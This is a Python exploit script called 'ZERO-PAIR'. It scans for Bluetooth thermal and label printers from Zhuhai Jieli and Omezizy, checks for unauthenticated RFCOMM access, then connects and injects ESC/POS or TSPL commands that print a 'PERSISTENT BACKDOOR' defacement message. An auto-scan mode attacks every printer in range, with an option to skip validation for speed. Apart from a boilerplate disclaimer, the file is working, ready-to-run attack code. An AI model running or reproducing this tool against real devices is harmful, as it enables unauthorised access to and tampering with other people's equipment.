#!/usr/bin/env python3
"""
ZERO-PAIR - Zero Authentication Bluetooth Exploit

"Steal The Print, Own The System"

Author: [CBKB] DeadlyData | 2026
Target: Zhuhai Jieli Thermal Printers (X6h-A725, M58-L) + Omezizy D450
Vulnerability: Zero Authentication RFCOMM Access
Type: ESC/POS Command Injection via Bluetooth

Usage:
    # Single target with full validation
    sudo python3 zeropair.py 66:32:9E:2E:FD:94
    
    # Single target, skip validation
    sudo python3 zeropair.py 66:32:9E:2E:FD:94 --skip
    
    # Auto-scan all printers with validation
    sudo python3 zeropair.py --scan
    
    # Auto-scan all printers, skip validation
    sudo python3 zeropair.py --scan --skip

DISCLAIMER:
    This tool is for authorized security testing and educational purposes only.
    Unauthorized access to computer systems is illegal. Use responsibly.
"""

import subprocess
import time
import sys
import os
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

# Known vulnerable device models
KNOWN_VULNERABLE_MODELS = {
    'X6h-A725': {'manufacturer': 'Zhuhai Jieli', 'default_pin': '1234', 'command_set': 'ESCPOS'},
    'M58-L': {'manufacturer': 'Zhuhai Jieli', 'default_pin': '1234', 'command_set': 'ESCPOS'},
    'D450': {'manufacturer': 'Omezizy', 'default_pin': '0000', 'command_set': 'TSPL'},
}

class ESCPOSPrinter:
    """ESC/POS command builder"""
    ESC = b'\x1b'
    GS = b'\x1d'
    
    INIT = ESC + b'@'
    BOLD_ON = ESC + b'E\x01'
    BOLD_OFF = ESC + b'E\x00'
    ALIGN_CENTER = ESC + b'a\x01'
    ALIGN_LEFT = ESC + b'a\x00'
    FONT_NORMAL = GS + b'!\x00'
    FONT_DOUBLE = GS + b'!\x11'
    FONT_QUAD = GS + b'!\x33'  # 4x size (quad)
    FEED_LINE = ESC + b'd\x01'
    CUT_PAPER = GS + b'V\x00'
    
    @staticmethod
    def text(text):
        return text.encode('utf-8', errors='ignore')
    
    @staticmethod
    def newline(count=1):
        return b'\n' * count

class TSPLPrinter:
    """TSPL command builder for label printers (D450)"""
    
    @staticmethod
    def build_label():
        """Build TSPL label with exploit message"""
        commands = []
        
        # Label setup - 4" x 3" label
        commands.append('SIZE 4,3')
        commands.append('GAP 0.12,0')
        commands.append('DIRECTION 1')
        commands.append('CLS')
        
        # Title
        commands.append('TEXT 50,20,"4",0,2,2,"ZERO-PAIR"')
        commands.append('TEXT 50,80,"3",0,1,1,"EXPLOITATION"')
        
        # Divider
        commands.append('BAR 10,130,580,3')
        
        # Header
        commands.append('TEXT 10,150,"2",0,1,1,"SECURITY ADVISORY"')
        commands.append('BAR 10,180,580,2')
        
        # Main message
        y = 200
        commands.append(f'TEXT 10,{y},"2",0,1,1,"This device was successfully"')
        y += 25
        commands.append(f'TEXT 10,{y},"2",0,1,1,"exploited via ZERO AUTHENTICATION"')
        y += 25
        commands.append(f'TEXT 10,{y},"2",0,1,1,"Bluetooth vulnerability."')
        
        # Vulnerability details
        y += 40
        commands.append(f'TEXT 10,{y},"2",0,1,1,"Vulnerability Class:"')
        y += 25
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- Static Default PIN (0000)"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- No Re-authentication"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- RFCOMM Unauthenticated Access"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- Persistent Pairing Trust"')
        
        # Exploitation method
        y += 35
        commands.append(f'TEXT 10,{y},"2",0,1,1,"Exploitation Method:"')
        y += 25
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- RFCOMM SPP Channel 1"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- TSPL Command Injection"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- Silent Reconnection"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"- No User Interaction"')
        
        # Target info
        y += 35
        commands.append(f'TEXT 10,{y},"2",0,1,1,"Target Information:"')
        y += 25
        commands.append(f'TEXT 10,{y},"1",0,1,1,"Manufacturer: Omezizy"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"Model: D450-BT Label Printer"')
        y += 20
        commands.append(f'TEXT 10,{y},"1",0,1,1,"Protocol: TSPL over RFCOMM"')
        
        # Warning
        y += 35
        commands.append(f'TEXT 50,{y},"3",0,2,2,"UNAUTHORIZED ACCESS"')
        y += 40
        commands.append(f'TEXT 50,{y},"3",0,2,2,"PERSISTENT BACKDOOR"')
        
        # Print command
        commands.append('PRINT 1,1')
        
        # Join with CRLF
        return '\r\n'.join(commands) + '\r\n'
    
    @staticmethod
    def to_bytes(commands_str):
        """Convert TSPL string to bytes"""
        return commands_str.encode('utf-8', errors='ignore')

def identify_device_model(name):
    """Identify device model from name"""
    name_upper = name.upper()
    
    for model, info in KNOWN_VULNERABLE_MODELS.items():
        if model.upper() in name_upper:
            return model, info
    
    # Check for generic model identifiers
    if 'D450' in name_upper or 'D-450' in name_upper:
        return 'D450', KNOWN_VULNERABLE_MODELS['D450']
    
    # Default to generic printer
    return None, None

def scan_bluetooth_devices():
    """Scan for all Bluetooth devices"""
    print(Fore.YELLOW + "[*] " + "scanning bluetooth devices", end='', flush=True)
    
    try:
        result = subprocess.run(['hcitool', 'scan'],
                              capture_output=True,
                              text=True,
                              timeout=15)
        
        print(Fore.GREEN + " [DONE]\n")
        
        devices = []
        for line in result.stdout.split('\n'):
            line = line.strip()
            if not line or 'Scanning' in line:
                continue
            
            parts = line.split('\t', 1)
            if len(parts) >= 1:
                mac = parts[0].strip()
                name = parts[1].strip() if len(parts) > 1 else "Unknown"
                
                # Validate MAC
                if ':' not in mac or len(mac) != 17:
                    continue
                
                # Get name from bluetoothctl if not available
                if not name or name == 'n/a':
                    try:
                        info = subprocess.run(['bluetoothctl', 'info', mac],
                                            capture_output=True,
                                            text=True,
                                            timeout=3)
                        for info_line in info.stdout.split('\n'):
                            if 'Name:' in info_line:
                                name = info_line.split(':', 1)[1].strip()
                                break
                    except:
                        pass
                
                if not name:
                    name = "Unknown"
                
                # Check if it's a known vulnerable model
                model, info = identify_device_model(name)
                is_known_vuln = model is not None
                
                # Also check for generic printer indicators
                is_printer = any(kw in name.lower() for kw in ['print', 'thermal', 'pos', 'receipt', 'd450', 'd-450'])
                
                if is_known_vuln or is_printer:
                    model_str = f" [{model}]" if model else ""
                    print(Fore.RED + f"    [PRINTER] {mac} ({name}){model_str}")
                    devices.append({'mac': mac, 'name': name, 'model': model, 'info': info})
                else:
                    print(Fore.CYAN + f"    [DEVICE]  {mac} ({name})")
        
        print()
        return devices
        
    except FileNotFoundError:
        print(Fore.RED + " [FAILED]")
        print(Fore.RED + "[!] hcitool not found - install bluez")
        return []
    except Exception as e:
        print(Fore.RED + " [FAILED]")
        print(Fore.RED + f"[!] scan error: {e}")
        return []

def check_pairing_status(mac):
    """Comprehensive pairing status check - validates vulnerability (SQLmap style)"""
    print(Fore.CYAN + "\n[*] " + "starting vulnerability validation...")
    
    status = {
        'bluetoothctl_paired': False,
        'bluetoothctl_visible': False,
        'cache_exists': False,
        'adapter_mac': None,
        'rfcomm_works': False
    }
    
    # Check 1: bluetoothctl info (silent)
    print(Fore.YELLOW + "[*] " + "testing user-space pairing visibility", end='', flush=True)
    try:
        result = subprocess.run(['bluetoothctl', 'info', mac],
                              capture_output=True,
                              text=True,
                              timeout=5)
        
        if 'not available' in result.stdout.lower() or result.returncode != 0:
            status['bluetoothctl_visible'] = False
        else:
            status['bluetoothctl_visible'] = True
            if 'Paired: yes' in result.stdout:
                status['bluetoothctl_paired'] = True
    except:
        pass
    print(Fore.GREEN + " [DONE]")
    
    # Check 2: Get local adapter MAC (silent)
    print(Fore.YELLOW + "[*] " + "identifying local bluetooth adapter", end='', flush=True)
    try:
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'BD Address:' in line:
                status['adapter_mac'] = line.split('BD Address:')[1].strip().split()[0]
                break
        
        if not status['adapter_mac']:
            result = subprocess.run(['bluetoothctl', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Address:' in line:
                    status['adapter_mac'] = line.split('Address:')[1].strip()
                    break
    except:
        pass
    print(Fore.GREEN + " [DONE]")
    
    # Check 3: Bluetooth cache files (silent)
    print(Fore.YELLOW + "[*] " + "checking filesystem pairing cache", end='', flush=True)
    if status['adapter_mac']:
        cache_paths = [
            f"/var/lib/bluetooth/{status['adapter_mac']}/{mac}",
            f"/var/lib/bluetooth/{status['adapter_mac']}/{mac.upper()}",
        ]
        
        for path in cache_paths:
            if os.path.exists(path):
                status['cache_exists'] = True
                break
    print(Fore.GREEN + " [DONE]")
    
    # Check 4: RFCOMM connectivity test (THE CRITICAL ONE)
    print(Fore.YELLOW + "[*] " + "testing RFCOMM unauthenticated access", end='', flush=True)
    
    subprocess.run(['sudo', 'rfcomm', 'release', '0'],
                  stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    
    result = subprocess.run(['sudo', 'rfcomm', 'bind', '0', mac, '1'],
                          capture_output=True,
                          text=True,
                          timeout=10)
    
    if result.returncode == 0:
        time.sleep(0.5)
        if os.path.exists('/dev/rfcomm0'):
            status['rfcomm_works'] = True
            subprocess.run(['sudo', 'rfcomm', 'release', '0'],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL)
    
    print(Fore.GREEN + " [DONE]")
    print()
    return status['rfcomm_works'], status

def analyze_vulnerability(connected, status):
    """Analyze vulnerability findings - SQLmap style output"""
    
    if connected:
        # Determine vulnerability type
        if not status['bluetoothctl_visible'] and not status['cache_exists']:
            vuln_type = "ZERO AUTHENTICATION"
            severity = "CRITICAL"
        elif status['bluetoothctl_paired'] and status['cache_exists']:
            vuln_type = "PERSISTENT PAIRING TRUST"
            severity = "HIGH"
        elif status['cache_exists']:
            vuln_type = "HIDDEN PAIRING STATE"
            severity = "HIGH"
        else:
            vuln_type = "UNKNOWN AUTHENTICATION BYPASS"
            severity = "HIGH"
        
        print(Fore.RED + Style.BRIGHT + f"[!] VULNERABILITY CONFIRMED")
        print(Fore.YELLOW + f"    Type: {vuln_type}")
        print(Fore.YELLOW + f"    Severity: {severity}")
        print()
        print(Fore.CYAN + "[*] vulnerability details:")
        print(Fore.WHITE + f"    [+] RFCOMM accessible: " + Fore.GREEN + "YES")
        print(Fore.WHITE + f"    [+] BlueZ visible: " + (Fore.GREEN + "YES" if status['bluetoothctl_visible'] else Fore.RED + "NO"))
        print(Fore.WHITE + f"    [+] BlueZ paired: " + (Fore.GREEN + "YES" if status['bluetoothctl_paired'] else Fore.RED + "NO"))
        print(Fore.WHITE + f"    [+] Cache exists: " + (Fore.GREEN + "YES" if status['cache_exists'] else Fore.RED + "NO"))
        print()
        print(Fore.GREEN + "[✓] target is exploitable - proceeding with attack")
        print()
    else:
        print(Fore.YELLOW + "[!] target validation failed")
        print()
        print(Fore.CYAN + "[*] diagnosis:")
        print(Fore.WHITE + f"    [-] RFCOMM accessible: " + Fore.RED + "NO")
        print(Fore.WHITE + f"    [~] BlueZ visible: " + (Fore.GREEN + "YES" if status['bluetoothctl_visible'] else Fore.RED + "NO"))
        print(Fore.WHITE + f"    [~] BlueZ paired: " + (Fore.GREEN + "YES" if status['bluetoothctl_paired'] else Fore.RED + "NO"))
        print(Fore.WHITE + f"    [~] Cache exists: " + (Fore.GREEN + "YES" if status['cache_exists'] else Fore.RED + "NO"))
        print()

def find_rfcomm_channel(mac):
    """Find RFCOMM channel for SPP"""
    try:
        result = subprocess.run(['sdptool', 'browse', mac],
                              capture_output=True,
                              text=True,
                              timeout=10)
        
        for line in result.stdout.split('\n'):
            if 'Channel:' in line:
                channel = line.split('Channel:')[1].strip()
                return channel
    except:
        pass
    
    return '1'  # Default to channel 1

def connect_rfcomm(mac, channel='1'):
    """Connect to device via RFCOMM"""
    subprocess.run(['sudo', 'rfcomm', 'release', '0'],
                  stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL)
    
    time.sleep(0.5)
    
    result = subprocess.run(['sudo', 'rfcomm', 'bind', '0', mac, channel],
                          capture_output=True,
                          text=True,
                          timeout=10)
    
    if result.returncode != 0:
        return None
    
    time.sleep(1)
    
    if os.path.exists('/dev/rfcomm0'):
        return '/dev/rfcomm0'
    
    return None

def print_exploit(device, target_name, model=None, device_info=None):
    """Send exploit payload to printer"""
    
    # Determine model info and command set
    command_set = 'ESCPOS'  # Default
    if model and device_info:
        manufacturer = device_info.get('manufacturer', 'Unknown')
        default_pin = device_info.get('default_pin', '1234')
        command_set = device_info.get('command_set', 'ESCPOS')
    else:
        # Try to detect from name
        detected_model, detected_info = identify_device_model(target_name)
        if detected_model:
            model = detected_model
            manufacturer = detected_info.get('manufacturer', 'Unknown')
            default_pin = detected_info.get('default_pin', '1234')
            command_set = detected_info.get('command_set', 'ESCPOS')
        else:
            manufacturer = 'Unknown'
            default_pin = '1234/0000'
    
    # Build commands based on printer type
    if command_set == 'TSPL':
        # TSPL label printer (D450)
        commands = TSPLPrinter.to_bytes(TSPLPrinter.build_label())
    else:
        # ESC/POS thermal printer (X6h-A725, M58-L)
        pos = ESCPOSPrinter
        
        commands = pos.INIT
        commands += pos.ALIGN_CENTER
        commands += pos.BOLD_ON
        commands += pos.FONT_QUAD
        commands += pos.text("ZERO-PAIR")
        commands += pos.newline()
        commands += pos.FONT_DOUBLE
        commands += pos.text("EXPLOITATION")
        commands += pos.BOLD_OFF
        commands += pos.FONT_NORMAL
        commands += pos.newline(2)
        
        commands += pos.ALIGN_LEFT
        commands += pos.text("="*32)
        commands += pos.newline()
        commands += pos.BOLD_ON
        commands += pos.text("SECURITY ADVISORY")
        commands += pos.BOLD_OFF
        commands += pos.newline()
        commands += pos.text("="*32)
        commands += pos.newline(2)
        
        commands += pos.text("This device was successfully")
        commands += pos.newline()
        commands += pos.text("exploited via ZERO AUTHENTICATION")
        commands += pos.newline()
        commands += pos.text("Bluetooth vulnerability.")
        commands += pos.newline(2)
        
        commands += pos.text("Vulnerability Class:")
        commands += pos.newline()
        commands += pos.text(f"- Static Default PIN ({default_pin})")
        commands += pos.newline()
        commands += pos.text("- No Re-authentication")
        commands += pos.newline()
        commands += pos.text("- RFCOMM Unauthenticated Access")
        commands += pos.newline()
        commands += pos.text("- Persistent Pairing Trust")
        commands += pos.newline()
        commands += pos.text("- Hidden Pairing State")
        commands += pos.newline(2)
        
        commands += pos.text("Exploitation Method:")
        commands += pos.newline()
        commands += pos.text("- RFCOMM SPP Channel 1")
        commands += pos.newline()
        commands += pos.text("- ESC/POS Command Injection")
        commands += pos.newline()
        commands += pos.text("- Silent Reconnection")
        commands += pos.newline()
        commands += pos.text("- No User Interaction")
        commands += pos.newline(2)
        
        commands += pos.text("Target Information:")
        commands += pos.newline()
        commands += pos.text(f"Device: {target_name}")
        commands += pos.newline()
        commands += pos.text(f"Manufacturer: {manufacturer}")
        commands += pos.newline()
        if model:
            commands += pos.text(f"Model: {model}")
        else:
            commands += pos.text("Model: X6h-A725 / M58-L / D450")
        commands += pos.newline()
        commands += pos.text("Protocol: ESC/POS over RFCOMM")
        commands += pos.newline(2)
        
        commands += pos.ALIGN_CENTER
        commands += pos.BOLD_ON
        commands += pos.text("UNAUTHORIZED ACCESS")
        commands += pos.newline()
        commands += pos.text("PERSISTENT BACKDOOR")
        commands += pos.BOLD_OFF
        commands += pos.newline()
        commands += pos.FEED_LINE * 3
    
    try:
        with open(device, 'wb') as printer:
            printer.write(commands)
            printer.flush()
        return True
    except Exception as e:
        return False

def cleanup():
    """Release RFCOMM"""
    subprocess.run(['sudo', 'rfcomm', 'release', '0'], 
                  capture_output=True)

def exploit_target(mac, name, validate=True, model=None, device_info=None):
    """Exploit a single target with optional validation"""
    print(Fore.CYAN + "\n[*] " + "="*58)
    print(Fore.CYAN + f"[*] target: {mac} ({name})")
    if model:
        print(Fore.CYAN + f"[*] model: {model}")
    print(Fore.CYAN + "[*] " + "="*58)
    
    # Validation checks
    if validate:
        connected, status = check_pairing_status(mac)
        analyze_vulnerability(connected, status)
        
        if not connected:
            print(Fore.RED + "[!] " + "target not vulnerable or requires pairing first")
            return False
    
    # Find channel
    print(Fore.YELLOW + "[*] " + "discovering RFCOMM channels", end='', flush=True)
    channel = find_rfcomm_channel(mac)
    print(Fore.GREEN + f" [channel {channel}]")
    
    # Connect
    print(Fore.YELLOW + "[*] " + "establishing RFCOMM connection", end='', flush=True)
    device = connect_rfcomm(mac, channel)
    
    if not device:
        print(Fore.RED + " [FAILED]")
        return False
    
    print(Fore.GREEN + " [CONNECTED]")
    
    # Exploit
    print(Fore.YELLOW + "[*] " + "injecting ESC/POS payload", end='', flush=True)
    success = print_exploit(device, name, model, device_info)
    
    # Cleanup
    cleanup()
    
    if success:
        print(Fore.GREEN + " [SUCCESS]")
        print(Fore.RED + "\n[💀] " + Style.BRIGHT + "exploitation successful - check printer output!")
        return True
    else:
        print(Fore.RED + " [FAILED]")
        return False

def main():
    print(Fore.RED + Style.BRIGHT + """
███████╗███████╗██████╗  ██████╗ 
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
  ███╔╝ █████╗  ██████╔╝██║   ██║
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
███████╗███████╗██║  ██║╚██████╔╝
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    ██████╗  █████╗ ██╗██████╗ 
    ██╔══██╗██╔══██╗██║██╔══██╗
    ██████╔╝███████║██║██████╔╝
    ██╔═══╝ ██╔══██║██║██╔══██╗
    ██║     ██║  ██║██║██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
""" + Fore.CYAN + """
    Zero Authentication Bluetooth Exploit
    """ + Fore.YELLOW + Style.BRIGHT + """"Steal The Print, Own The System"
    """ + Style.NORMAL + Fore.WHITE + """
    """ + Fore.RED + """[CBKB] DeadlyData""" + Fore.WHITE + """ | 2026
    Zhuhai Jieli (X6h-A725, M58-L) + Omezizy D450
    Type: ESC/POS Command Injection via RFCOMM
    
    """ + Fore.RED + Style.BRIGHT + """[!] DISCLAIMER [!]
    """ + Fore.WHITE + Style.NORMAL + """This tool is for """ + Fore.GREEN + """authorized security testing """ + Fore.WHITE + """and """ + Fore.GREEN + """educational purposes """ + Fore.WHITE + """only.
    Unauthorized access to computer systems is """ + Fore.RED + """illegal""" + Fore.WHITE + """. The author assumes """ + Fore.RED + """no liability
    """ + Fore.WHITE + """and is """ + Fore.RED + """not responsible """ + Fore.WHITE + """for any misuse or damage caused by this tool.
    Use responsibly and """ + Fore.GREEN + """only on systems you own """ + Fore.WHITE + """or have """ + Fore.GREEN + """explicit permission """ + Fore.WHITE + """to test.
    
    """ + Style.RESET_ALL)
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description='ZERO-PAIR - Zero Authentication Bluetooth Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target with full validation
  sudo python3 %(prog)s 66:32:9E:2E:FD:94
  
  # Single target, skip validation (faster)
  sudo python3 %(prog)s 66:32:9E:2E:FD:94 --skip
  
  # Auto-scan all printers with validation
  sudo python3 %(prog)s --scan
  
  # Auto-scan all printers, skip validation (fastest)
  sudo python3 %(prog)s --scan --skip
        """
    )
    
    parser.add_argument('target', nargs='?', help='Target MAC address (e.g., 66:32:9E:2E:FD:94)')
    parser.add_argument('--scan', '-a', action='store_true', help='Auto-scan mode: find and exploit all printers')
    parser.add_argument('--skip', '-s', action='store_true', help='Skip validation checks (faster exploitation)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.scan and not args.target:
        parser.error("Must specify either a target MAC address or use --scan mode")
    
    if args.scan and args.target:
        parser.error("Cannot use both --scan and target MAC address")
    
    # Determine if we should validate
    validate = not args.skip
    
    if args.target:
        # Single target mode
        mode = "validation enabled" if validate else "fast mode (validation skipped)"
        print(Fore.YELLOW + f"[*] single target mode ({mode})\n")
        
        success = exploit_target(args.target, "Unknown Device", validate=validate)
        
        if success:
            print(Fore.GREEN + "\n[✓] " + Style.BRIGHT + "exploitation completed successfully")
        else:
            print(Fore.RED + "\n[✗] " + Style.BRIGHT + "exploitation failed")
    
    elif args.scan:
        # Auto-scan mode
        mode = "validation enabled" if validate else "fast mode"
        print(Fore.YELLOW + f"[*] auto-scan mode ({mode})")
        print(Fore.YELLOW + "[*] scanning for vulnerable printers...\n")
        
        # Scan for devices
        printers = scan_bluetooth_devices()
        
        if not printers:
            print(Fore.RED + "[!] no vulnerable printers found")
            sys.exit(1)
        
        print(Fore.GREEN + f"[+] identified {len(printers)} potential target(s)")
        print(Fore.YELLOW + f"[*] initiating exploitation sequence...\n")
        time.sleep(1)
        
        # Exploit each printer
        success_count = 0
        fail_count = 0
        
        for i, printer in enumerate(printers, 1):
            print(Fore.CYAN + f"[*] [{i}/{len(printers)}] processing target...")
            
            if exploit_target(printer['mac'], printer['name'], validate=validate, 
                            model=printer.get('model'), device_info=printer.get('info')):
                success_count += 1
            else:
                fail_count += 1
            
            if i < len(printers):
                time.sleep(1)
        
        # Summary
        print(Fore.CYAN + "\n[*] " + "="*58)
        print(Fore.CYAN + "[*] exploitation summary")
        print(Fore.CYAN + "[*] " + "="*58)
        print(Fore.GREEN + f"[+] successful: {success_count}/{len(printers)}")
        if fail_count > 0:
            print(Fore.YELLOW + f"[!] failed: {fail_count}/{len(printers)}")
        print(Fore.RED + "\n[💀] " + Style.BRIGHT + "check all printers for output!")

if __name__ == "__main__":
    main()
